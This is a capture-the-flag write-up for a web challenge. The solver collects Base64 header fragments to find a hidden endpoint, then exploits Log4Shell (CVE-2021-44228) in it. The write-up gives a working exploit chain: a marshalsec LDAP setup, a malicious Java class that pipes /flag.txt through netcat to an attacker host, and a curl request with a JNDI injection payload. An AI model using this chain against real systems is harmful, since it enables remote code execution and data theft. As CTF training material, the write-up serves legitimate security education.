# Challenge Name: Escape The Matrix

## Category: WEB

## Author: pickleomar

### Summary

The solve for this challenge consists of going through a sequential Matrix-themed puzzle and then exploiting a hidden Log4Shell vulnerability.

First, we collect fragmented information from HTTP response headers while progressing through the different steps. After reconstructing the hidden endpoint, we discover that the `v0id` parameter is vulnerable to Log4Shell (CVE-2021-44228), allowing us to execute commands on the server and retrieve the real flag.

# POC

## STEP 1: Collecting the Matrix Fragments

After accessing the challenge, we are presented with a Matrix-themed interface where we can navigate through different GIF puzzles.

![alt text](ss/matrix.png)

Each time we click **Next Matrix**, the frontend sends a request to:

```http
GET /api/escape?step={0-12}&sessionId={uuid}
```

The response contains a custom `X-Matrix-Id` header:

```http
X-Matrix-Id: {base64_fragment}
X-Cooldown-Remaining: 30
```

The interesting part here is that the `X-Matrix-Id` header contains a Base64 fragment.

There are **13 steps**, and each step gives us another fragment. However, there is also a **30-second cooldown** between requests for the same `sessionId`.

![alt text](ss/headers.png)

We can therefore automate the process and collect all the fragments:

```python
import requests
import base64
import uuid
import time

session_id = str(uuid.uuid4())
fragments = []

base_url = "http://localhost:8080"

for step in range(13):
    print(f"[+] Collecting fragment {step + 1}/13...")

    r = requests.get(
        f"{base_url}/api/escape",
        params={
            "step": step,
            "sessionId": session_id
        }
    )

    fragment = r.headers.get("X-Matrix-Id")

    if fragment:
        fragments.append(fragment)
        print(f"    Fragment: {fragment[:20]}...")

    if step < 12:
        print("    Waiting 31 seconds...")
        time.sleep(31)

full_b64 = "".join(fragments)

decoded = base64.b64decode(full_b64).decode("utf-8")

print(decoded)
```

After collecting all 13 fragments and joining them together, we decode the resulting Base64 string.

This reveals:

```text
Hidden endpoint discovered: /api/m4tr1x_Esc4p3d/enT3r_th3_v0iD
Parameter: v0id
```

So now we have a new endpoint to investigate.

## STEP 2: Discovering the Hidden Endpoint

We send a request to the endpoint we discovered:

```http
POST /api/m4tr1x_Esc4p3d/enT3r_th3_v0iD
Content-Type: application/json

{
    "v0id": "test"
}
```

At first, nothing particularly interesting happens.

However, since we are dealing with a Java application, the next thing worth investigating is how the `v0id` parameter is processed by the backend.

Looking at the application configuration and dependencies, we find:

```text
Spring Boot 2.5.6
Java 8
Log4j 2.14.1
```

Log4j `2.14.1` is affected by **CVE-2021-44228**, better known as **Log4Shell**.

The vulnerable code is:

```java
logger.info("Entering the void with: {}", request.getV0id());
```

This means that the value supplied through `v0id` reaches the vulnerable Log4j logging operation.

At this point, we should start thinking about JNDI injection.

## STEP 3: Exploiting Log4Shell

The idea is to make the vulnerable server perform a JNDI lookup to an LDAP server controlled by us.

First, we prepare the LDAP referral server using `marshalsec`:

```bash
git clone https://github.com/mbechler/marshalsec
cd marshalsec
mvn clean package -DskipTests
```

Then we start the LDAP server:

```bash
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar \
  marshalsec.jndi.LDAPRefServer \
  "http://YOUR_IP:8000/#Exploit"
```

Next, we create the malicious Java class that will be loaded by the vulnerable application:

```java
public class Exploit {

    static {
        try {
            String[] cmd = {
                "/bin/sh",
                "-c",
                "cat /flag.txt | nc YOUR_IP 4444"
            };

            Runtime.getRuntime().exec(cmd);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

We compile it using Java 8:

```bash
javac Exploit.java -source 8 -target 8
```

Then we host the resulting `Exploit.class`:

```bash
python3 -m http.server 8000
```

And finally, we start a listener to receive the flag:

```bash
nc -lvnp 4444
```

Now everything is ready.

We trigger the vulnerable endpoint with the JNDI payload:

```bash
curl -X POST http://localhost:8080/api/m4tr1x_Esc4p3d/enT3r_th3_v0iD \
  -H "Content-Type: application/json" \
  -d '{"v0id":"${jndi:ldap://YOUR_IP:1389/Exploit}"}'
```

The exploitation flow is:

```text
v0id
  ↓
Log4j
  ↓
JNDI lookup
  ↓
LDAP server
  ↓
HTTP server
  ↓
Exploit.class
  ↓
Command execution
  ↓
cat /flag.txt
  ↓
nc YOUR_IP 4444
```

The vulnerable backend connects to our LDAP server, which redirects it to our HTTP server to retrieve `Exploit.class`.

The static block of the class is then executed, causing the contents of `/flag.txt` to be sent to our listener.

![alt text](ss/log4shell.png)

Our listener receives the flag:

```text
NSC{...}
```

And that's it. We escaped the Matrix.

#### Disclaimer

This challenge intentionally uses **Log4j 2.14.1** and **CVE-2021-44228** as part of the exploitation chain. It is designed for authorized CTF and security-training environments only.
